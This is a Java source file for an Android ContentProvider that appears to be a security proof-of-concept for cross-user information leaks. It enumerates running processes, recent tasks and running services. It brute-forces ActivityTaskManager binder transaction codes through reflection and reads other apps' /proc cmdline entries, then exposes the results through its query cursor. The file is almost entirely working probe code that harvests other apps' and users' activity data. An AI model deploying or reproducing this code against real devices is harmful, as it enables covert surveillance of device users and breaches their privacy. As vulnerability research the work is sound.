package com.poc.crossuser;

import android.content.ContentProvider;
import android.content.ContentValues;
import android.database.Cursor;
import android.database.MatrixCursor;
import android.net.Uri;
import android.os.IBinder;
import android.os.Parcel;
import java.lang.reflect.Method;

public class ActivityLeakProvider extends ContentProvider {

    @Override
    public boolean onCreate() { return true; }

    @Override
    public Cursor query(Uri uri, String[] proj, String sel, String[] selArgs, String sort) {
        MatrixCursor cursor = new MatrixCursor(new String[]{"test", "result"});
        cursor.addRow(new Object[]{"uid", String.valueOf(android.os.Process.myUid())});

        // High-value targets: ActivityManager methods that leak cross-app/cross-user state
        testActivityManager(cursor);
        testActivityTaskManager(cursor);
        testProcessManager(cursor);

        return cursor;
    }

    private void testActivityManager(MatrixCursor cursor) {
        IBinder binder = getServiceBinder("activity");
        if (binder == null) { cursor.addRow(new Object[]{"am", "no_binder"}); return; }
        String desc = "android.app.IActivityManager";

        // getRunningAppProcesses() - reveals what processes are running
        // In modern Android this is restricted... but let's verify
        // TX code varies by version. Let's try common ones.

        // TX=66 in Android 14+: getRunningAppProcesses()
        // Actually the TX codes change per version, let's just try getMyMemoryState
        // which is always accessible

        // Let's test getProcessMemoryInfo(int[] pids) - TX varies
        // Instead, let's use the ActivityManager API directly via reflection
        try {
            android.app.ActivityManager am = (android.app.ActivityManager)
                getContext().getSystemService("activity");
            java.util.List<?> processes = am.getRunningAppProcesses();
            if (processes != null) {
                cursor.addRow(new Object[]{"runningProcesses_count", String.valueOf(processes.size())});
                for (int i = 0; i < Math.min(processes.size(), 15); i++) {
                    android.app.ActivityManager.RunningAppProcessInfo info =
                        (android.app.ActivityManager.RunningAppProcessInfo) processes.get(i);
                    cursor.addRow(new Object[]{"proc_" + i, "pid=" + info.pid + " pkg=" + info.processName + " imp=" + info.importance});
                }
            } else {
                cursor.addRow(new Object[]{"runningProcesses", "null"});
            }
        } catch (Exception e) {
            cursor.addRow(new Object[]{"runningProcesses", "ERR:" + e.getClass().getSimpleName()});
        }

        // getRecentTasks - shows recently used apps (very sensitive!)
        try {
            android.app.ActivityManager am = (android.app.ActivityManager)
                getContext().getSystemService("activity");
            java.util.List<android.app.ActivityManager.RecentTaskInfo> tasks = am.getRecentTasks(20, 0);
            if (tasks != null) {
                cursor.addRow(new Object[]{"recentTasks_count", String.valueOf(tasks.size())});
                for (int i = 0; i < Math.min(tasks.size(), 10); i++) {
                    android.app.ActivityManager.RecentTaskInfo task = tasks.get(i);
                    String topAct = task.topActivity != null ? task.topActivity.flattenToShortString() : "null";
                    String baseAct = task.baseActivity != null ? task.baseActivity.flattenToShortString() : "null";
                    cursor.addRow(new Object[]{"recent_" + i, "base=" + baseAct + " top=" + topAct});
                }
            } else {
                cursor.addRow(new Object[]{"recentTasks", "null"});
            }
        } catch (Exception e) {
            cursor.addRow(new Object[]{"recentTasks", "ERR:" + e.getClass().getSimpleName() + ":" + truncate(e.getMessage())});
        }

        // getRunningServices - what services are running
        try {
            android.app.ActivityManager am = (android.app.ActivityManager)
                getContext().getSystemService("activity");
            java.util.List<android.app.ActivityManager.RunningServiceInfo> services =
                am.getRunningServices(100);
            if (services != null) {
                cursor.addRow(new Object[]{"runningServices_count", String.valueOf(services.size())});
                for (int i = 0; i < Math.min(services.size(), 10); i++) {
                    android.app.ActivityManager.RunningServiceInfo svc = services.get(i);
                    cursor.addRow(new Object[]{"svc_" + i, "pkg=" + svc.service.getPackageName() +
                        "/" + svc.service.getClassName() + " pid=" + svc.pid});
                }
            } else {
                cursor.addRow(new Object[]{"runningServices", "null"});
            }
        } catch (Exception e) {
            cursor.addRow(new Object[]{"runningServices", "ERR:" + e.getClass().getSimpleName()});
        }
    }

    private void testActivityTaskManager(MatrixCursor cursor) {
        IBinder binder = getServiceBinder("activity_task");
        if (binder == null) { cursor.addRow(new Object[]{"atm", "no_binder"}); return; }
        String desc = "android.app.IActivityTaskManager";

        // getTasks(int maxNum, boolean filterOnlyVisibleRecents, boolean keepIntentExtra,
        //          int displayId)
        // This can potentially reveal what the user is doing across all profiles
        // Let's try with different display IDs and see what happens

        // Scan promising TX codes
        // In Android 16, getTasks might be around TX=8-12
        for (int tx = 1; tx <= 20; tx++) {
            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            try {
                data.writeInterfaceToken(desc);
                data.writeInt(10); // maxNum or first int param
                data.writeInt(0); // boolean/int
                data.writeInt(0); // boolean/int
                data.writeInt(0); // displayId
                boolean result = binder.transact(tx, data, reply, 0);
                if (!result) {
                    cursor.addRow(new Object[]{"atm_tx" + tx, "NO_SUCH_TX"});
                } else {
                    int ex = reply.readInt();
                    if (ex == 0) {
                        int avail = reply.dataAvail();
                        cursor.addRow(new Object[]{"atm_tx" + tx, "SUCCESS avail=" + avail});
                    } else {
                        String msg = reply.readString();
                        cursor.addRow(new Object[]{"atm_tx" + tx, "Ex=" + ex + "|" + truncate(msg)});
                    }
                }
            } catch (Exception e) {
                cursor.addRow(new Object[]{"atm_tx" + tx, "THROW:" + e.getClass().getSimpleName()});
            }
            data.recycle();
            reply.recycle();
        }
    }

    private void testProcessManager(MatrixCursor cursor) {
        // Check if we can get process list via /proc
        try {
            java.io.File procDir = new java.io.File("/proc");
            String[] pids = procDir.list();
            int processCount = 0;
            StringBuilder interestingProcs = new StringBuilder();
            if (pids != null) {
                for (String pid : pids) {
                    try {
                        Integer.parseInt(pid);
                        processCount++;
                        // Try to read cmdline
                        java.io.File cmdline = new java.io.File("/proc/" + pid + "/cmdline");
                        if (cmdline.canRead()) {
                            java.io.FileInputStream fis = new java.io.FileInputStream(cmdline);
                            byte[] buf = new byte[256];
                            int read = fis.read(buf);
                            fis.close();
                            if (read > 0) {
                                String cmd = new String(buf, 0, read).replace('\0', ' ').trim();
                                if (cmd.contains("com.") && !cmd.contains("poc.crossuser")) {
                                    if (interestingProcs.length() < 500) {
                                        interestingProcs.append(pid).append(":").append(cmd).append("|");
                                    }
                                }
                            }
                        }
                    } catch (NumberFormatException ignored) {}
                    catch (Exception ignored) {}
                }
            }
            cursor.addRow(new Object[]{"proc_total", String.valueOf(processCount)});
            String procs = interestingProcs.toString();
            if (procs.length() > 0) {
                // Split into rows to fit
                while (procs.length() > 0) {
                    int end = Math.min(procs.length(), 200);
                    cursor.addRow(new Object[]{"proc_apps", procs.substring(0, end)});
                    procs = procs.substring(end);
                }
            } else {
                cursor.addRow(new Object[]{"proc_apps", "none_readable"});
            }
        } catch (Exception e) {
            cursor.addRow(new Object[]{"proc", "ERR:" + e.getClass().getSimpleName()});
        }
    }

    private String truncate(String s) {
        if (s == null) return "null";
        return s.length() > 120 ? s.substring(0, 120) : s;
    }

    private IBinder getServiceBinder(String name) {
        try {
            Class<?> sm = Class.forName("android.os.ServiceManager");
            Method m = sm.getMethod("getService", String.class);
            return (IBinder) m.invoke(null, name);
        } catch (Exception e) {
            return null;
        }
    }

    @Override public String getType(Uri uri) { return null; }
    @Override public Uri insert(Uri uri, ContentValues values) { return null; }
    @Override public int delete(Uri uri, String sel, String[] selArgs) { return 0; }
    @Override public int update(Uri uri, ContentValues values, String sel, String[] selArgs) { return 0; }
}
